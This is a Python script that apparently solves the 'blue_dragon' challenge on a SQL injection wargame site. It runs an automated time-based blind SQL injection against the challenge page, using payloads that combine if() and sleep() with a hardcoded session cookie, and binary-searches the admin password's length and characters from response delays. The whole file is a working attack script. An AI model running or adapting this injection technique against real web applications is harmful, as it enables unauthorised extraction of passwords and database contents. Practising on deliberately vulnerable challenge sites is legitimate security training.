import asyncio
import aiohttp
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
sleep_time = 5
threshold = 3.0
COOKIE = {"PHPSESSID": "02jmu8p54lc2d2qk2o14jb6s9o"}


async def check_condition(session, payload):
    """Return True if query triggered sleep (slow response)."""
    params = {"id": payload, "pw": "1"}
    start = time.time()
    try:
        async with session.get(url, params=params, timeout=sleep_time + 3) as r:
            await r.text()
    except asyncio.TimeoutError:
        return True
    elapsed = time.time() - start
    return elapsed > threshold


async def get_length(session, max_len=50):
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        payload = f"' or if(id ='admin' and length(pw)>{mid},sleep({sleep_time}),1)#"
        if await check_condition(session, payload):
            low = mid + 1
        else:
            high = mid - 1
    return low


async def get_char(session, pos):
    low, high = 32, 126  # printable ASCII
    while low <= high:
        mid = (low + high) // 2
        payload = f"' or if(id ='admin' and ascii(substr(pw,{pos},1))>{mid},sleep({sleep_time}),1)#"
        if await check_condition(session, payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)


async def extract():
    async with aiohttp.ClientSession(cookies=COOKIE) as session:
        length = await get_length(session)
        print(f"[i] Length of pw: {length}")
        result = ""
        for pos in range(1, length + 1):
            c = await get_char(session, pos)
            result += c
            print(f"[+] Position {pos}: {result + '*' * (length - len(result))}")
        print(f"\n[+] Final pw: {result}")


if __name__ == "__main__":
    asyncio.run(extract())
